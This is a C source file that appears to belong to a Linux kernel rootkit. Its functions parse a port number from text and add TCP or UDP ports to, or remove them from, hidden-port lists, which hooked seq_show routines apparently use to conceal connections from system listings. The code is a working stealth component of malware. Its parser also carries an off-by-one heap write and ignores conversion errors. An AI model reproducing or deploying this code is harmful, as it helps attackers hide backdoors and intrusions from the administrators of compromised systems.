#include "hideport.h"
#include "../hooker/tcp_seq_show.h"
#include "../hooker/udp_seq_show.h"


int get_number_from_text(char *content)
{
    int i;
    long port;
    char *numbers;
    int size = strlen(content);
    numbers = (char *) kmalloc(size, GFP_KERNEL);

    for (i = 0; i < size; i++) {
        if (*(content+i) == '\n' || *(content+i) == ' ') {
            break;
        }
        *(numbers + i) = *(content + i);
    }
    *(numbers+i) = 0x00;
    i = kstrtol(numbers, 10, &port);
    kfree(numbers);
    return port;
}

void hide_tcp_port(char *content)
{
    add_hidden_tcp_port(get_number_from_text(content));
}

void show_hidden_tcp_port(char *content)
{
    remove_hidden_tcp_port(get_number_from_text(content));
}

void hide_udp_port(char *content)
{
    add_hidden_udp_port(get_number_from_text(content));
}

void show_hidden_udp_port(char *content)
{
    remove_hidden_udp_port(get_number_from_text(content));
}
